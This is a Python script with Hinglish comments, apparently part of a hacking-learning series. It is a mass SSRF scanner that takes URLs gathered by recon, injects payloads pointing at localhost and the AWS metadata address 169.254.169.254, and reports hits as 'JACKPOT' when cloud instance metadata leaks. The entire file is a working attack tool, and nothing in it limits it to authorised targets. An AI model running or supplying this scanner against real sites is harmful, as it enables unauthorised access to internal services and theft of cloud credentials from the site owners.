import requests
import sys

def mass_ssrf_scan(file_path):
    print(f"\n[*] Bhai, loading target URLs for SSRF from: {file_path}")
    
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print("[-] Arre yaar, file nahi mili. Path check karo!")
        return

    print("[*] Filtering URLs for SSRF testing...")
    target_urls = []
    
    for line in lines:
        if "http" in line and "=" in line:
            clean_url = line.strip().replace("-> ", "").replace("->", "").strip()
            # "=" ke baad ka original data hata kar hum apna target set karenge
            base_url = clean_url.split("=")[0] + "="
            if base_url not in target_urls:
                target_urls.append(base_url)

    print(f"[+] Extracted {len(target_urls)} unique parameter URLs!\n")
    print("--------------------------------------------------")

    # The Hacker's SSRF Payloads
    # 1. Localhost (Internal Admin Panel)
    # 2. AWS Cloud Metadata IP (Jahan Cloud ki secret keys hoti hain)
    payloads = [
        "http://localhost:80",
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/"
    ]

    for url in target_urls:
        for payload in payloads:
            vuln_url = url + payload
            print(f"[*] Testing SSRF: {vuln_url}")
            
            try:
                # Server ko request bhej rahe hain (Server hamari taraf se payload wale URL ko hit karega)
                response = requests.get(vuln_url, timeout=5)
                
                # Check 1: Cloud Metadata leak
                if "ami-id" in response.text or "instance-id" in response.text:
                    print(f"\n   [!!!] JACKPOT 🎯 AWS CLOUD SSRF FOUND!")
                    print(f"   [!!!] Vulnerable URL: {vuln_url}\n")
                    break 
                
                # Check 2: Localhost Internal Access
                # Agar humein server ka internal dashboard (jaise Apache/Nginx default page) dikh jaye
                elif "It works!" in response.text or "Welcome to nginx" in response.text:
                    print(f"\n   [!!!] BINGO 🎯 INTERNAL LOCALHOST SSRF FOUND!")
                    print(f"   [!!!] Vulnerable URL: {vuln_url}\n")
                    break
                    
            except requests.exceptions.RequestException:
                print(f"   [-] Connection skipped/timeout for this URL.")

    print("--------------------------------------------------")
    print("[+] SSRF Mass Scan Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 ssrf_tester.py <path_to_urls.txt>")
        print("Example: python3 ssrf_tester.py ../Day_56_Master_Recon_Pipeline/wayback_urls.txt")
        sys.exit(1)
        
    target_file = sys.argv[1]
    mass_ssrf_scan(target_file)
